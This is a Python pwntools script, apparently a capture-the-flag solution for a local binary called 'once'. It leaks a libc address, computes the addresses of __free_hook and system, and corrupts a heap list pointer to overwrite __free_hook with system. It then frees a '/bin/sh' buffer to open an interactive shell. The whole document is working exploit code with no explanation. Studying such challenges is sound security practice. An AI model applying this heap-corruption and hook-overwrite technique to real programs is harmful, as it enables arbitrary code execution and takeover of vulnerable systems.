from pwn import *

os.environ['LD_PRELOAD'] = './libc-2.23.so'
libc = ELF('./libc-2.23.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'

r = process('./once')

def self_malloc():
    r.sendlineafter('> ', '1')
def self_read(content):
    r.sendlineafter('> ', '2')
    r.send(content)
def self_unlink():
    r.sendlineafter('> ', '3')

def malloc(size):
    r.sendlineafter('> ', '4')
    r.sendlineafter('> ', '1')
    r.sendlineafter('input size:\n', str(size))
    r.sendlineafter('> ', '4')

r.sendlineafter('> ', '6')
r.recvuntil('Invalid choice\n')
libc_base = int(r.recv(14), 16) - libc.symbols['puts']
__free_hook = libc_base + libc.symbols['__free_hook']
system = libc_base + libc.symbols['system']
log.info('libc base: %#x' % libc_base)

self_malloc()
self_read('\x00'*0x18+'\x56')
self_unlink()
malloc(0x100)


self_read('\x00'*0x12+p64(__free_hook-0x8))
r.sendlineafter('> ', '4')
r.sendlineafter('> ', '2')
r.send('/bin/sh\x00'+p64(system))
r.sendlineafter('> ', '3')

r.interactive()
